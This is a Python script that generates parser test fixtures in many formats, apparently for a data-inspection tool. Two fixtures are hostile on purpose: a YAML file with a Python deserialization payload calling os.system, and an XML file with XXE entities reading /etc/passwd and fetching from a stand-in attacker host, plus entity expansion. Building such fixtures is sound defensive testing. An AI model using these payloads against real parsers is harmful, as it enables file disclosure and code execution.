"""Generate the data-family fixture inputs (self-generated, CC0-1.0).

Run from the repository root:

    uv run python fixtures/data/_generate.py            # everything except Parquet
    uv run --with pyarrow python fixtures/data/_generate.py   # also writes the Parquet fixture

Every input is deterministic. Text files are written with LF line endings and UTF-8 unless the case
tests an encoding feature (the BOM case).
"""

from __future__ import annotations

import json
import sqlite3
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
NL = chr(10)
TAB = chr(9)
BOM = chr(0xFEFF)

CITIES = ["Lisbon", "Oslo", "Quito", "Nairobi", "Hanoi", "Perth", "Tromso", "Cusco", "Accra", "Riga"]
ITEMS = ["bolts", "washers", "hinges", "brackets", "rivets", "springs", "gaskets", "clamps"]


def _write(case: str, name: str, text: str) -> None:
    d = ROOT / case
    d.mkdir(parents=True, exist_ok=True)
    (d / name).write_bytes(text.encode("utf-8"))


def csv_bom_semicolon() -> None:
    rows = [
        "id;name;amount;note",
        '1;"M' + chr(0xFC) + 'ller, Anna";1234,50;"first line' + NL + 'second line"',
        "2;S" + chr(0xF8) + "ren;99,00;plain",
        '3;"O""Brien";0,75;"has ; semicolon"',
        "4;Zoe;-12,30;",
    ]
    _write("csv-bom-semicolon", "input.csv", BOM + NL.join(rows) + NL)


def csv_wide() -> None:
    header = [
        "sku",
        "name",
        "city",
        "qty",
        "price",
        "weight_kg",
        "color",
        "supplier",
        "lead_days",
        "in_stock",
        "rating",
        "updated",
    ]
    lines = [",".join(header)]
    for i in range(8):
        lines.append(
            ",".join(
                [
                    f"SKU-{1000 + i}",
                    ITEMS[i % len(ITEMS)],
                    CITIES[i % len(CITIES)],
                    str(10 * (i + 1)),
                    f"{3 + i * 1.25:.2f}",
                    f"{0.5 + i / 10:.1f}",
                    ["red", "blue", "green"][i % 3],
                    f"Supplier {chr(65 + i)}",
                    str(7 + i),
                    "true" if i % 2 == 0 else "false",
                    f"{4 + (i % 2) * 0.5:.1f}",
                    f"2026-0{1 + i % 9}-1{i}",
                ]
            )
        )
    _write("csv-wide", "input.csv", NL.join(lines) + NL)


def csv_long() -> None:
    lines = ["row,city,item,qty"]
    for i in range(1, 1201):
        lines.append(f"{i},{CITIES[i % len(CITIES)]},{ITEMS[(i * 7) % len(ITEMS)]},{(i * 37) % 500}")
    _write("csv-long", "input.csv", NL.join(lines) + NL)


def tsv_basic() -> None:
    lines = [
        TAB.join(["station", "date", "temp_c", "comment"]),
        TAB.join(["North Ridge", "2026-03-01", "-4.5", "light snow, calm"]),
        TAB.join(["Harbor", "2026-03-01", "6.0", "fog until 10:00"]),
        TAB.join(["Valley", "2026-03-02", "3.25", ""]),
        TAB.join(["Summit", "2026-03-02", "-11.0", "wind 40 km/h"]),
    ]
    _write("tsv-basic", "input.tsv", NL.join(lines) + NL)


def json_records() -> None:
    # Hand-written so number literals stay verbatim (1.10, 19-digit ids, 1e400).
    records = [
        '  {"id": 1234567890123456789, "name": "Ada", "score": 1.10, "active": true, '
        '"address": {"city": "Lisbon", "zip": "1100-001"}, "tags": ["admin", "ops"]}',
        '  {"id": 2, "name": "Grace", "score": 2.50, "active": false, '
        '"address": {"city": "Oslo", "zip": null}, "tags": []}',
        '  {"id": 3, "name": "Linus | Jr", "score": 1e400, "active": null, '
        '"address": {"city": "Quito"}, "note": "only here"}',
    ]
    _write("json-records", "input.json", "[" + NL + ("," + NL).join(records) + NL + "]" + NL)


def json_nested_config() -> None:
    config = {
        "service": {"name": "inventory-api", "version": "2.4.1", "debug": False},
        "server": {
            "host": "0.0.0.0",  # noqa: S104 fixture data, not a bind
            "port": 8080,
            "tls": {"enabled": True, "cert": "/etc/certs/api.pem", "ciphers": ["TLS_AES_128_GCM_SHA256"]},
        },
        "database": {
            "primary": {"url": "file:inventory.db", "pool": {"min": 1, "max": 8}},
            "replicas": [{"region": "eu-west", "lag_ms": 120}, {"region": "us-east", "lag_ms": 340}],
        },
        "features": ["search", "export", "audit"],
        "limits": {"a": {"b": {"c": {"d": {"e": {"f": "deep value"}}}}}},
        "matrix": [[1, 2], [3, 4]],
        "empty": {},
    }
    _write("json-nested-config", "input.json", json.dumps(config, indent=2) + NL)


def jsonl_logs() -> None:
    levels = ["INFO", "WARN", "ERROR"]
    lines = []
    for i in range(12):
        lines.append(
            json.dumps(
                {
                    "ts": f"2026-05-01T10:{i:02d}:00Z",
                    "level": levels[i % 3],
                    "msg": f"request {i} handled",
                    "ms": 10 + i * 3,
                }
            )
        )
    lines.append('{"ts": "2026-05-01T10:12:00Z", "level": "INFO", "msg": "trunc')
    _write("jsonl-logs", "input.jsonl", NL.join(lines) + NL)


def yaml_anchors_unsafe() -> None:
    text = NL.join(
        [
            "# Deployment settings for the demo service.",
            "defaults: &defaults",
            "  retries: 3",
            "  timeout_s: 1.50",
            "  region: eu-west",
            "staging:",
            "  <<: *defaults",
            "  replicas: 2",
            "production:",
            "  <<: *defaults",
            "  replicas: 6",
            "  region: us-east",
            "hooks:",
            "  - name: notify",
            "    url: https://hooks.example.invalid/notify",
            "  - name: audit",
            "    url: https://hooks.example.invalid/audit",
            "# The next value must never be constructed as a Python object.",
            'payload: !!python/object/apply:os.system ["echo pwned"]',
            "released: 2026-04-01",
            "",
        ]
    )
    _write("yaml-anchors-unsafe", "input.yaml", text)


def toml_config() -> None:
    text = NL.join(
        [
            'title = "Warehouse sync"',
            "version = 3",
            "ratio = 1.10",
            "enabled = true",
            "started = 2026-02-03T04:05:06Z",
            "",
            "[owner]",
            'name = "Operations"',
            'email = "ops@example.invalid"',
            "",
            "[sync.schedule]",
            'cron = "*/15 * * * *"',
            'zones = ["eu", "us"]',
            "",
            "[[targets]]",
            'name = "primary"',
            "weight = 70",
            "",
            "[[targets]]",
            'name = "backup"',
            "weight = 30",
            "",
        ]
    )
    _write("toml-config", "input.toml", text)


def xml_namespaces() -> None:
    books = [
        ("b1", "en", "R. Field", "EUR", "12.50"),
        ("b2", "pt", "M. Costa", "EUR", "9.00"),
        ("b3", "no", "K. Berg", "NOK", "110"),
        ("b4", "en", "A. Moss", "GBP", "7.25"),
        ("b5", "es", "L. Vega", "EUR", "15.00"),
        ("b6", "lv", "I. Ozola", "EUR", "11.40"),
    ]
    lines = [
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<catalog xmlns="urn:example:catalog" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2">',
        "  <dc:title>Spring parts catalog</dc:title>",
    ]
    for ident, lang, creator, currency, price in books:
        lines += [
            f'  <book id="{ident}" lang="{lang}">',
            f"    <dc:creator>{creator}</dc:creator>",
            f'    <price currency="{currency}">{price}</price>',
            "  </book>",
        ]
    lines += [
        '  <supplier code="S1"><name>North Mill</name><city>Oslo</city></supplier>',
        '  <supplier code="S2"><name>Harbor Works</name><city>Lisbon</city></supplier>',
        "  <notes>",
        "    <note>Prices exclude VAT.</note>",
        "    <note>Stock is updated nightly.</note>",
        "  </notes>",
        "</catalog>",
        "",
    ]
    _write("xml-namespaces", "input.xml", NL.join(lines))


def xml_xxe() -> None:
    text = NL.join(
        [
            '<?xml version="1.0"?>',
            "<!DOCTYPE order [",
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '  <!ENTITY remote SYSTEM "http://attacker.example.invalid/x.dtd">',
            '  <!ENTITY lol "lol">',
            '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">',
            "]>",
            "<order>",
            "  <customer>&xxe;</customer>",
            "  <ref>&remote;</ref>",
            "  <memo>&lol2; &amp; more</memo>",
            "  <total>42</total>",
            "</order>",
            "",
        ]
    )
    _write("xml-xxe", "input.xml", text)


def sqlite_two_tables() -> None:
    d = ROOT / "sqlite-two-tables"
    d.mkdir(parents=True, exist_ok=True)
    path = d / "input.sqlite"
    if path.exists():
        path.unlink()
    con = sqlite3.connect(path)
    try:
        con.executescript(
            NL.join(
                [
                    "PRAGMA page_size=4096;",
                    "CREATE TABLE customers (id INTEGER PRIMARY KEY, name TEXT NOT NULL, city TEXT, joined TEXT);",
                    "CREATE TABLE orders (id INTEGER PRIMARY KEY, customer_id INTEGER NOT NULL"
                    " REFERENCES customers(id), total REAL, note TEXT, receipt BLOB);",
                    "CREATE INDEX idx_orders_customer ON orders(customer_id);",
                    "CREATE VIEW big_orders AS SELECT * FROM orders WHERE total > 100;",
                ]
            )
        )
        for i in range(1, 6):
            con.execute(
                "INSERT INTO customers VALUES (?, ?, ?, ?)",
                (i, f"Customer {i}", CITIES[i % len(CITIES)], f"2025-0{i}-15"),
            )
        for i in range(1, 131):
            con.execute(
                "INSERT INTO orders VALUES (?, ?, ?, ?, ?)",
                (i, 1 + i % 5, round(12.5 * (i % 11), 2), None if i % 4 else f"note {i}", bytes(range(i % 7))),
            )
        con.commit()
        con.execute("VACUUM")
    finally:
        con.close()


def parquet_basic() -> None:
    try:
        import pyarrow as pa
        import pyarrow.parquet as pq
    except ImportError:
        print("pyarrow not installed; skipping parquet-basic", file=sys.stderr)
        return
    import datetime as dt
    import decimal

    n = 150
    table = pa.table(
        {
            "id": pa.array(list(range(1, n + 1)), pa.int64()),
            "city": pa.array([CITIES[i % len(CITIES)] for i in range(n)]),
            "amount": pa.array([decimal.Decimal(f"{i}.{i % 100:02d}") for i in range(n)], pa.decimal128(10, 2)),
            "seen": pa.array(
                [dt.datetime(2026, 1, 1, tzinfo=dt.UTC) + dt.timedelta(hours=i) for i in range(n)],
                pa.timestamp("ms", tz="UTC"),
            ),
            "dims": pa.array([{"w": i % 5, "h": i % 3} for i in range(n)]),
            "flag": pa.array([None if i % 10 == 0 else i % 2 == 0 for i in range(n)], pa.bool_()),
        }
    )
    d = ROOT / "parquet-basic"  # meta.toml `requires = ["data"]`: skipped without pyarrow
    d.mkdir(parents=True, exist_ok=True)
    pq.write_table(table, d / "input.parquet", row_group_size=60, compression="snappy")


def connection_string() -> None:
    _write("connection-string", "input.txt", "postgres://user:hunter2@db.example.invalid:5432/sales" + NL)


def main() -> None:
    csv_bom_semicolon()
    csv_wide()
    csv_long()
    tsv_basic()
    json_records()
    json_nested_config()
    jsonl_logs()
    yaml_anchors_unsafe()
    toml_config()
    xml_namespaces()
    xml_xxe()
    sqlite_two_tables()
    parquet_basic()
    connection_string()


if __name__ == "__main__":
    main()
